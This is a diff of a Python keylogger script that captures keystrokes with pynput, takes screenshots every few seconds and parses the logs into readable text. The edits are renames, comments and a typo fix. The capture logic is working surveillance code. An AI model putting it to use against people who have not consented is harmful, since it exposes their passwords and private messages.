@@ -1,5 +1,8 @@
 # Import built-in modules #
-import logging, pathlib, re, time
+import logging
+import pathlib
+import re
+import time
 import os
 from multiprocessing import Process
 
@@ -11,7 +14,7 @@ from pynput.keyboard import Key, Listener
 ################
 Function Index #
 ########################################################################################################################
-OnPress - For key listener, write sentence to file if enter is pressed, kill screenshot capturing process if escape
+OnPress - For key listener, write sentence to file if enter is pressed, kill screenshot capturing process if escape \
           is pressed, otherwise append the entered key to the key capture list to form sentence.
 Screenshots - Loop that actively takes screenshots.         
 RegexFormatting - Parses the logged pynput keys into into human readable format.
@@ -23,26 +26,26 @@ main - Facilitates key listener thread and screenshot capture.
 WAIT_TIME = 3
 
 # Global variables #
-global command_file, screenshot
+global key_file, screenshot
 last_pic = 0
 
 
 '''
 ########################################################################################################################
 Name:       OnPress
-Purpose:    For key listener, write sentence to file if enter is pressed, kill screenshot capturing process if escape
+Purpose:    For key listener, write sentence to file if enter is pressed, kill screenshot capturing process if escape \
             is pressed, otherwise append the entered key to the key capture list to form sentence.
 Parameters: The key that the key listener detected the user pressed.
 Returns:    Nothing on enter key, boolean false on escape key, otherwise the keys capture list with new member.
 ########################################################################################################################
 '''
 def OnPress(key):
-    global command_file, keys, screenshot
+    global key_file, keys, screenshot
 
     # If the enter key was pressed #
     if key == Key.enter:
         # Write the sentence logged in keys capture list to file #
-        command_file.write(str(keys) + '\n\n')
+        key_file.write(str(keys) + '\n\n')
         del keys[:]
     # If the escape key was pressed #
     elif key == Key.esc:
@@ -85,6 +88,7 @@ def Screenshots(path: str):
             # Increment static count #
             last_pic += 1
 
+        # Sleep execution by time interval #
         time.sleep(WAIT_TIME)
 
 
@@ -97,6 +101,7 @@ Returns:    None
 ########################################################################################################################
 '''
 def RegexFormatting(path):
+    # Compile parsing patterns #
     regex = re.compile(r'(?:(^\[)|([\',])|(]$))')
     regex2 = re.compile(r'''<Key\.
                             (?:ctrl|shift|alt|caps_lock|
@@ -112,14 +117,20 @@ def RegexFormatting(path):
     regex4 = re.compile(r'.<Key\.backspace:<8>>')
     regex5 = re.compile(r'<Key\.space:>')
 
-    with open(path + 'keys.txt') as parse_file:
+    # Open un-formatted file #
+    with open(f'{path}keys.txt') as parse_file:
+        # Iterate line by line #
         for line in parse_file:
+            # Perform a series of parsing substitutions #
             sub = re.sub(regex, r'', str(line))
             sub2 = re.sub(regex2, r'', str(sub))
             sub3 = re.sub(regex3, r'', str(sub2))
             sub4 = re.sub(regex4, r'', str(sub3))
             result = re.sub(regex5, r' ', str(sub4))
-            with open(path + 'commands.txt', 'a') as final_log:
+
+            # Open the result command log file #
+            with open(f'{path}commands.txt', 'a') as final_log:
+                # Write parsed result to file #
                 final_log.write(result)
 
 
@@ -132,11 +143,12 @@ Returns:    None
 ########################################################################################################################
 '''
 def main():
-    global command_file, screenshot
+    global key_file, screenshot
 
     input('Please hit enter to begin\n')
 
-    with open(f'{file_path}keys.txt', 'a') as command_file:
+    # Open the file to record keystrokes #
+    with open(f'{file_path}keys.txt', 'a') as key_file:
         # Create the key listener and screenshot taker #
         key_listener = Listener(on_press=OnPress)
         screenshot = Process(target=Screenshots, args=(file_path,))
@@ -149,12 +161,14 @@ def main():
         key_listener.join(600.0)
         screenshot.join(timeout=600)
 
+    # Call the function to parse key logs to readable format #
     RegexFormatting(file_path)
 
     main()
 
 
 if __name__ == '__main__':
+    # List to temporarily store captured keys #
     keys = []
 
     # If OS is Windows #
@@ -174,4 +188,4 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         print('* Ctrl-C detected ... exiting program *')
     except Exception as ex:
-        logging.exception('* Error Ocurred: {} *'.format(ex))
+        logging.exception('* Error Occurred: {} *'.format(ex))
